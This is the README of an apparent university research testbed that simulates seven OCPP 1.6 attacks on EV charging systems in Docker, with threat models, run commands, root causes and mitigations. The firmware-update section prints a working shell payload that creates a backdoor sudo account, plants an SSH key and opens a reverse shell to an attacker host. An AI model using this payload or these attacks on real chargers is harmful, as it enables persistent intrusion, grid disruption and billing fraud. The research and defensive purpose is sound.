# EVSecSim — OCPP 1.6 Security Research Testbed

A proof-of-concept security research framework demonstrating known attack vectors against EV charging infrastructure over OCPP 1.6. Built for the SUTD thesis project on EV charging cybersecurity.

> **For authorized research and educational use only.**

---

## Overview

EVSecSim simulates a minimal EV charging ecosystem consisting of:

- A **CSMS** (Central System / Charge Point Management System) over WebSocket
- An **EVSE client** (EV Supply Equipment) backed by a live pandapower grid twin
- Seven **attack scripts** demonstrating published OCPP 1.6 vulnerabilities across both internal and external threat models

The attacks target weaknesses documented by SaiFlow (2023) and Idaho National Laboratory (INL/CON-23-72329, 2023): no transport encryption, no message authentication, no connection deduplication, no charge-point identity verification, and no firmware signature verification.

---

## Project Structure

```
SUTDEVsec/
├── Dockerfile                      # Shared image for all services
├── docker-compose.yml              # Full containerised topology
├── capture_attacks.ps1             # Automated pcap capture for all profiles
├── .dockerignore
├── requirements.txt
├── core/
│   ├── csms_server4.py             # OCPP 1.6 CSMS (WebSocket server on port 9000)
│   └── evse_client4_fixed.py       # Legitimate EVSE client + pandapower grid simulation
└── attacks/
    ├── run_attacks.py                  # Interactive orchestrator (local use)
    ├── attack_saiflow_dos_patched.py   # Attack 1:  SaiFlow duplicate-CP DoS
    ├── attack_fdi.py                   # Attack 2:  MeterValues False Data Injection
    ├── attack_mitm_session_patched.py  # Attack 3a: MITM proxy — internal (operator-net)
    ├── attack_mitm_ext.py              # Attack 3b: MITM proxy — external (public-net)
    ├── attack_load_altering.py         # Attack 4:  Coordinated botnet load altering
    ├── attack_firmware.py              # Attack 5:  Malicious firmware update / RCE
    ├── attack_duration_spoof.py        # Attack 6:  Duration spoofing (StopTransaction drop)
    └── a6breakers.py                   # Grid topology visualiser (Plotly HTML)
```

---

## Containerised Network Topology

Each component runs in its own container on a logically separate network segment. The CSMS is dual-homed. External attackers on `public-net` can only reach `172.20.0.10:9000` and have zero visibility into `operator-net`.

```
  ┌──────────────────────────────────────────────────────────────────────────────┐
  │                        public-net  ·  172.20.0.0/24                           │
  │                                                                                │
  │  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐  │
  │  │  atk-saiflow  │   │   atk-load   │   │ atk-mitm-ext │   │evse-via-mitm │  │
  │  │ 172.20.0.30   │   │ 172.20.0.40  │   │ 172.20.0.30  │   │  -ext        │  │
  │  │ (Attack 1)    │   │ (Attack 4)   │   │ (Attack 3b)  │   │ 172.20.0.50  │  │
  │  └──────┬────────┘   └──────┬───────┘   └──────┬───────┘   └──────┬───────┘  │
  │         │                   │                   │  proxy :9002     │           │
  │         └─────────┬─────────┘       ws://csms:9000  ◄─────────────┘           │
  │                   │ ws://csms:9000               │                             │
  │                   ▼                              ▼                             │
  │          ┌─────────────────────────────────────────┐                          │
  │          │              csms  172.20.0.10            │ ◄── :9000 → host       │
  │          └─────────────────────┬───────────────────┘                          │
  └────────────────────────────────│──────────────────────────────────────────────┘
                                   │ dual-homed
  ┌────────────────────────────────│──────────────────────────────────────────────┐
  │               operator-net  ·  172.19.0.0/24  [internal · isolated]            │
  │                                   │                                             │
  │                       ┌───────────┴──────────┐                                 │
  │                       │    csms  172.19.0.10  │                                 │
  │                       └──┬────┬────┬──────────┘                                │
  │                          │    │    │    │                                       │
  │         ┌────────────────┘    │    │    └──────────────┐                       │
  │         ▼                     ▼    ▼                   ▼                       │
  │  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐   │
  │  │    evse      │  │ evse-via-fdi │  │   atk-mitm   │  │   atk-firmware   │   │
  │  │ 172.19.0.20  │  │ 172.19.0.30  │  │ 172.19.0.40  │  │  172.19.0.30    │   │
  │  │ (legit EVSE) │  │(compromised) │  │ proxy :9001  │  │ rogue CSMS :9000 │   │
  │  └─────────────┘  └──────────────┘  └──────┬───────┘  │ payload HTTP:8080│   │
  │                                              │          └────────┬─────────┘   │
  │                                ws://atk-mitm:9001               │             │
  │                                              ▼                   ▼             │
  │                                 ┌──────────────────┐  ┌──────────────────┐    │
  │                                 │  evse-via-mitm   │  │ evse-via-firmware│    │
  │                                 │  172.19.0.50     │  │  172.19.0.60     │    │
  │                                 └──────────────────┘  └──────────────────┘    │
  │                                                                                │
  │  ┌──────────────────────────┐                                                  │
  │  │  atk-duration-spoof      │  proxy :9003  ←── evse-via-duration-spoof       │
  │  │  172.19.0.41  (Attack 6) │  drops StopTransaction, injects phantom load    │
  │  │  evse-via-duration-spoof │                                                  │
  │  │  172.19.0.61             │                                                  │
  │  └──────────────────────────┘                                                  │
  └────────────────────────────────────────────────────────────────────────────────┘
```

### Threat model per attack

| # | Attack | Attacker position | Network | Operator-net visible? | Initial access vector |
|---|--------|-------------------|---------|----------------------|----------------------|
| 1 | SaiFlow DoS | External | public-net | No | Direct WebSocket to exposed CSMS port |
| 2 | False Data Injection | Compromised EVSE (insider) | operator-net | Yes | Supply chain / physical compromise |
| 3a | MITM — Internal | Compromised network device | operator-net | Yes | ARP poisoning / rogue switch |
| 3b | MITM — External | External attacker | public-net | No | BGP hijack / DNS poisoning / rogue cloud proxy |
| 4 | Load Altering | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
| 5 | Malicious Firmware Update | Rogue / compromised CSMS | operator-net | Yes | DNS poisoning / compromised CSMS platform |
| 6 | Duration Spoofing | MITM on operator LAN | operator-net | Yes | ARP poisoning / rogue switch |

---

## Docker Deployment

### Prerequisites

- Docker Desktop (or Docker Engine + Compose plugin)

### Run scenarios

```bash
# Baseline — CSMS + legitimate EVSE (no attack)
docker compose --profile normal up --build

# Attack 1 — SaiFlow DoS  (external attacker + victim EVSE)
docker compose --profile saiflow up --build

# Attack 2 — False Data Injection  (compromised EVSE)
docker compose --profile fdi up --build

# Attack 3a — MITM proxy, INTERNAL  (operator-net, ARP poisoning threat model)
docker compose --profile mitm up --build

# Attack 3b — MITM proxy, EXTERNAL  (public-net, BGP/DNS hijack threat model)
docker compose --profile mitm-ext up --build

# Attack 4 — Coordinated load altering  (external botnet, 10 bots)
docker compose --profile load up --build

# Attack 5 — Malicious firmware update  (rogue CSMS, no real CSMS started)
docker compose --profile firmware up --build

# Attack 6 — Duration spoofing  (StopTransaction drop, phantom load)
docker compose --profile duration-spoof up --build
```

Drop `--build` on repeat runs if no code has changed.

### Follow logs

```bash
# All containers in a scenario
docker compose --profile fdi logs -f

# Individual containers
docker logs -f csms
docker logs -f evse-via-fdi
docker logs -f atk-mitm
docker logs -f atk-mitm-ext
docker logs -f atk-firmware
docker logs -f evse-via-firmware
docker logs -f atk-duration-spoof
docker logs -f evse-via-duration-spoof
```

### Tear down

```bash
docker compose --profile <profile> down --remove-orphans
```

### Automated pcap capture

`capture_attacks.ps1` automates the full capture workflow for each profile: builds containers, waits for initialisation, runs `tcpdump` inside the capture container for the configured window, extracts the pcap, and tears down.

```powershell
# Capture all profiles in sequence (~9 min total)
.\capture_attacks.ps1

# Capture one profile
.\capture_attacks.ps1 -Profile saiflow
.\capture_attacks.ps1 -Profile duration-spoof
```

Output files are written to `captures\attack_<label>.pcap`. Open in Wireshark and right-click any TCP stream on port 9000 → **Decode As → WebSocket** to view OCPP JSON payloads.

### Wireshark filters by attack

| Attack | Capture container | Filter |
|--------|------------------|--------|
| Normal baseline | `csms` | `websocket` |
| FDI | `csms` | `websocket && ip.dst == 172.19.0.10` |
| MITM internal | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9001)` |
| MITM external | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9002)` |
| SaiFlow / Load | `csms` | `websocket && ip.dst == 172.20.0.10` |
| Firmware | `atk-firmware` | `websocket \|\| http` |
| Duration spoofing | `atk-duration-spoof` | `websocket && (tcp.port == 9000 or tcp.port == 9003)` |

For Attack 5 also inspect the HTTP payload delivery (port 8080 is published to host):

```bash
curl http://localhost:8080/firmware.sh
```

For Attack 6 the key evidence spans two ports: StopTransaction on port 9003 (EVSE→proxy, **absent on port 9000**), then phantom MeterValues on port 9000 only after port 9003 goes silent.

---

## Local Quick Start (no Docker)

### Requirements

```
ocpp==2.1.0
websockets==16.0
pandapower==3.4.0
numpy==2.2.0
matplotlib==3.10.0
plotly==6.7.0
```

```bash
pip install -r requirements.txt
```

### Run components manually

```bash
# Terminal 1 — CSMS
python core/csms_server4.py

# Terminal 2 — Legitimate EVSE (300s pandapower simulation)
python core/evse_client4_fixed.py

# Terminal 2 — Timed charging session (for duration-spoof testing)
python core/evse_client4_fixed.py --session-duration 20

# Terminal 2 — EVSE via internal MITM proxy (port 9001)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001

# Terminal 2 — EVSE via external MITM proxy (port 9002)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002

# Terminal 2 — EVSE via duration-spoof proxy (port 9003)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Attack 5 — rogue CSMS replaces the real one; EVSE connects to it
# Terminal 1 (rogue CSMS + HTTP payload server):
python attacks/attack_firmware.py
# Terminal 2 (EVSE — points at rogue CSMS, NOT the real one):
python core/evse_client4_fixed.py --url ws://127.0.0.1:9000

# Attack 6 — duration spoof proxy (run alongside real CSMS)
# Terminal 1: python core/csms_server4.py
# Terminal 2: python attacks/attack_duration_spoof.py
# Terminal 3: python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20
```

---

## Attacks

### Attack 1 — SaiFlow Denial-of-Service

**Script:** `attacks/attack_saiflow_dos_patched.py`  
**Profile:** `saiflow`  
**Network:** public-net (external attacker)

Exploits OCPP 1.6's lack of duplicate-connection detection. A rogue client connects with the same CP ID (`CP_1`) as a legitimate EVSE. The CSMS accepts the second connection without deduplication, creating session shadowing: operator commands are routed to the attacker's socket, not the real charger. A Heartbeat flood (~1000 HB/s) then saturates the CSMS event loop.

```bash
python attacks/attack_saiflow_dos_patched.py
python attacks/attack_saiflow_dos_patched.py --cp-id CP_2 --duration 30
python attacks/attack_saiflow_dos_patched.py --interval 0.1
```

**Root cause:** No CP authentication; no connection registry in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 with mutual TLS; CSMS-side duplicate-session rejection.

---

### Attack 2 — False Data Injection (FDI)

**Script:** `attacks/attack_fdi.py`  
**Profile:** `fdi`  
**Network:** operator-net (insider / compromised EVSE)

A compromised EVSE fabricates MeterValues readings. The CSMS trusts all reported values unconditionally — no signing or plausibility check exists.

| Phase | Real draw | Reported to CSMS | Effect |
|-------|-----------|------------------|--------|
| 1 — Normal | 60 kW | 60 kW | Baseline |
| 2 — Under-report | 60 kW | 0 kW | Grid load hidden; billing zeroed |
| 3 — Over-report | 0 kW | 999 kW | Phantom demand event triggered |

```bash
python attacks/attack_fdi.py
CSMS_URL=ws://127.0.0.1:9000 python attacks/attack_fdi.py
```

**Root cause:** MeterValues are unsigned and unverified in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 signed MeterValues; CSMS plausibility checks; cross-reference with SCADA.

---

### Attack 3a — MITM WebSocket Proxy (Internal)

**Script:** `attacks/attack_mitm_session_patched.py`  
**Profile:** `mitm`  
**Network:** operator-net (172.19.0.40)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

An attacker already on the operator LAN intercepts the plaintext OCPP channel between the EVSE and CSMS.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0–10 s | All traffic forwarded and logged, nothing modified |
| 2 — MeterValues tampering | 10–20 s | Real kW values replaced with 999 kW before reaching CSMS |
| 3 — StopTransaction injection | 20 s+ | Forged `StopTransaction` sent to CSMS; session closed while EVSE keeps charging; billing corrupted |

```bash
python attacks/attack_mitm_session_patched.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_session_patched.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001
```

**Root cause:** Plaintext WebSocket (ws://); no message integrity.  
**Mitigation:** TLS (wss://); mutual TLS certificate authentication; OCPP 2.0.1 per-message signing.

---

### Attack 3b — MITM WebSocket Proxy (External)

**Script:** `attacks/attack_mitm_ext.py`  
**Profile:** `mitm-ext`  
**Network:** public-net (172.20.0.30) — **zero operator-net access**  
**Initial access:** BGP hijacking / DNS poisoning / rogue cloud reverse proxy

An attacker on the WAN path intercepts EVSE traffic destined for a cloud-hosted CSMS. No physical presence at the charging site is required. The attack exploits the fact that OCPP 1.6 uses plaintext `ws://` on the public internet, providing no protection against WAN-level interception.

Same three-phase attack capability as 3a (transparent relay → MeterValues tampering → StopTransaction injection), but achieved entirely from the public network:

```bash
python attacks/attack_mitm_ext.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_ext.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002
```

**Key distinction from 3a:** The attacker is on `public-net` only. This models real-world scenarios where EVSEs connect to cloud CSMS platforms over 4G/LTE, and the attacker intercepts the WAN path rather than the local LAN.

**Root cause:** No TLS on the WAN path; no certificate pinning; EVSE cannot distinguish real CSMS from a proxy.  
**Mitigation:** WSS + certificate pinning; mutual TLS; DNS-over-TLS / DNSSEC; OCPP 2.0.1 signed messages.

---

### Attack 4 — Coordinated Load Altering

**Script:** `attacks/attack_load_altering.py`  
**Profile:** `load`  
**Network:** public-net (external botnet)

A botnet of compromised EVSEs connects to the CSMS and executes coordinated load commands. A pandapower grid twin (220 kV → 66 kV → 22 kV; 500 EV chargers; 1,510 MW total load) runs a power flow after each phase and reports real grid impact metrics.

| Phase | Action | Grid effect |
|-------|--------|-------------|
| Baseline | All bots at 220 kW | Normal operation |
| Surge | All bots simultaneously max load | Voltage sag; transformer overload |
| Drop | All bots simultaneously drop to zero | Voltage rise; unnecessary generation dispatch |
| Oscillate | Bots toggle 0 ↔ 220 kW every 5 s | Protection relay misoperation risk |

```bash
python attacks/attack_load_altering.py --bots 10
python attacks/attack_load_altering.py --bots 50    # 10% of 500-station fleet
python attacks/attack_load_altering.py --bots 500   # full fleet takeover
```

**Root cause:** No per-CP rate limiting; no operator-signed charging profiles.  
**Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS anomaly detection; grid-side ROCOL protection relays.

---

### Attack 5 — Malicious Firmware Update / Remote Code Execution

**Script:** `attacks/attack_firmware.py`  
**Profile:** `firmware`  
**Network:** operator-net (172.19.0.30)  
**Based on:** INL/CON-23-72329 PoC #3

OCPP 1.6 `UpdateFirmware` carries a plain HTTP/FTP URL and a scheduled retrieval time. There is no firmware signature field, no certificate, and no integrity hash. The EVSE trusts the URL unconditionally and installs whatever is served.

This script acts as a **rogue CSMS** and simultaneously runs an embedded HTTP server serving a malicious shell script payload. No real CSMS is started in the `firmware` profile — `atk-firmware` replaces it entirely.

| Phase | Description |
|-------|-------------|
| 1 — Normal operation (0–10 s) | EVSE connects, boots, sends MeterValues normally. No OCPP mechanism exists to verify CSMS identity. |
| 2 — Firmware push (t = 10 s) | Rogue CSMS sends `UpdateFirmware` pointing at `http://atk-firmware:8080/firmware.sh`. |
| 3 — Payload execution | EVSE downloads the script, prints its full contents, walks through `Downloading → Downloaded → Installing → Installed` with no integrity check at any step. |

**Payload delivered to EVSE (`firmware.sh`):**
```sh
useradd -m -s /bin/bash backdoor
echo 'backdoor:EV$ecr3t!' | chpasswd
usermod -aG sudo backdoor
echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
```

```bash
python attacks/attack_firmware.py
python attacks/attack_firmware.py --push-delay 5
python attacks/attack_firmware.py --firmware-host atk-firmware --push-delay 10
```

**Root cause:** `UpdateFirmware` in OCPP 1.6 has no signature field; EVSE has no way to verify CSMS identity (no mutual TLS).  
**Mitigation:** OCPP 2.0.1 `SignedUpdateFirmware` with X.509 certificate chain; mutual TLS on CSMS WebSocket; EVSE-side firmware hash and signature verification before installation.

---

### Attack 6 — Duration Spoofing (StopTransaction Suppression)

**Script:** `attacks/attack_duration_spoof.py`  
**Profile:** `duration-spoof`  
**Network:** operator-net (172.19.0.41)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

OCPP 1.6 gives the CSMS no independent mechanism to detect when an EV physically disconnects — it relies entirely on the EVSE sending `StopTransaction`. A MITM proxy can intercept and suppress this message, sustaining a phantom charging session on the CSMS after the real EV has left.

This is the **opposite** of premature session termination (Attack 3a). Rather than forging an early stop, it prevents the legitimate stop from being acknowledged by the real CSMS, keeping the session open indefinitely.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0 s → real disconnect | `BootNotification`, `StartTransaction`, and `MeterValues` forwarded normally. Proxy captures `transactionId` from the `StartTransaction` ACK. |
| 2 — StopTransaction DROP | At real disconnect | EVSE sends `StopTransaction`. Proxy intercepts it, sends a **forged ACK** back to the EVSE so it disconnects cleanly. The message is **not forwarded** to the CSMS — the CSMS never learns the session ended. |
| 3 — Ghost session | 50 s (configurable) | Proxy injects synthetic `MeterValues` at 60 kW every 10 s, sustaining the phantom session. After the ghost window, a final `StopTransaction` is sent to clean up CSMS state. |

**PGTwin impact:** The CSMS reports an active 60 kW load on a physically idle charger. If the CSMS feeds load data to the PGTwin grid twin at each `MeterValues` interval, the simulation accumulates non-existent grid demand. With the default 50 s ghost window, **0.83 kWh of phantom energy** is injected per spoofed session. The error grows linearly with ghost duration and number of targeted chargers.

**Evidence in the pcap (capture container: `atk-duration-spoof`, filter: `port 9003 or port 9000`):**
- `StopTransaction` appears on port 9003 (EVSE→proxy) — **absent on port 9000** (proxy→CSMS)
- Forged ACK appears on port 9003 (proxy→EVSE) at the same instant
- Phantom `MeterValues` appear on port 9000 only, after port 9003 goes silent

```bash
# Run the proxy (Terminal 1 after starting CSMS)
python attacks/attack_duration_spoof.py --csms-url ws://127.0.0.1:9000

# Run EVSE with a timed session so it sends StopTransaction (Terminal 2)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Longer ghost phase for PGTwin integration demo
python attacks/attack_duration_spoof.py --ghost-duration 120 --meter-interval 5
```

**Root cause:** `StopTransaction` is unsigned and unverified; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
**Mitigation:** WSS + mutual TLS (prevents MITM interposition); CSMS Heartbeat inactivity timeout (Heartbeat stops when EVSE disconnects, eventually triggering a timeout); OCPP 2.0.1 signed `StopTransaction`; physical pilot-signal monitoring (CSMS cross-checks CP state against EVSE presence signal).

---

### Grid Topology Visualiser

**Script:** `attacks/a6breakers.py`

Builds the full grid twin (220 kV → 66 kV → 22 kV, 7 town loads × 200 MW, 500 EV chargers × 220 kW) and exports an interactive Plotly diagram to `grid_visualization.html`. Run locally — not included in Docker profiles.

```bash
python attacks/a6breakers.py
```

---

## References

- Saposnik, L.R. & Porat, D. (2023). *Hijacking EV charge points to cause DoS.* SaiFlow Security Advisory.
- Johnson et al. (2023). *Disrupting EV Charging Sessions.* Idaho National Laboratory, INL/CON-23-72329.
- Open Charge Alliance. *OCPP 1.6 Specification.*
- Open Charge Alliance. *OCPP 2.0.1 Security Whitepaper.*
